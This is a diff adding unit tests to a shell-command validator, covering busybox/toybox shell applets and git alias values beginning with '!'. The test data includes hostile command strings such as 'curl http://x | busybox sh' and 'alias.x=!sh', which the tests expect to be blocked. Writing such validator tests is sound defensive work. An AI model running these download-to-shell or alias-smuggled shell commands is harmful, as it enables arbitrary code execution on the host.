@@ -193,3 +193,44 @@ class TestSymmetryTopLevelVsSubstitution:
     def test_blocks_both_top_level_and_in_substitution(self, inner):
         assert validate_command(inner).risk_level == RiskLevel.BLOCKED
         assert validate_command(f"echo $({inner})").risk_level == RiskLevel.BLOCKED
+
+
+class TestMulticallBinaryResolution:
+    """busybox/toybox must be classified by their applet, not the wrapper name."""
+
+    def test_busybox_shell_applet_blocks(self):
+        assert validate_command("cat x | busybox sh").risk_level == RiskLevel.BLOCKED
+
+    def test_toybox_shell_applet_blocks(self):
+        assert validate_command("cat x | toybox sh").risk_level == RiskLevel.BLOCKED
+
+    def test_busybox_download_to_shell_applet_blocks(self):
+        assert validate_command("curl http://x | busybox sh").risk_level == RiskLevel.BLOCKED
+
+    def test_busybox_inline_code_applet_allowed(self):
+        # busybox sh -c '...' runs the inline code, not piped stdin
+        assert validate_command("cat x | busybox sh -c 'echo hi'").risk_level != RiskLevel.BLOCKED
+
+    def test_busybox_nonshell_applet_allowed(self):
+        assert validate_command("cat x | busybox ls").risk_level != RiskLevel.BLOCKED
+
+    def test_bare_busybox_allowed(self):
+        # bare busybox (no applet) prints usage; it does not execute stdin
+        assert validate_command("cat x | busybox").risk_level != RiskLevel.BLOCKED
+
+
+class TestGitAliasBangAtValueStart:
+    """git alias is a shell command only when its VALUE starts with '!' (not contains)."""
+
+    def test_real_shell_alias_dangerous(self):
+        assert dangerous_git_config(["-c", "alias.x=!sh", "status"]) is not None
+
+    def test_leading_space_then_bang_dangerous(self):
+        assert dangerous_git_config(["-c", "alias.x= !sh", "status"]) is not None
+
+    def test_bang_not_at_value_start_is_safe(self):
+        assert dangerous_git_config(["-c", "alias.x=echo hi!", "status"]) is None
+        assert dangerous_git_config(["-c", "alias.lg=log --grep=!fixme", "log"]) is None
+
+    def test_end_to_end_non_shell_alias_not_blocked(self):
+        assert validate_command('git -c "alias.x=echo hi!" status').risk_level != RiskLevel.BLOCKED
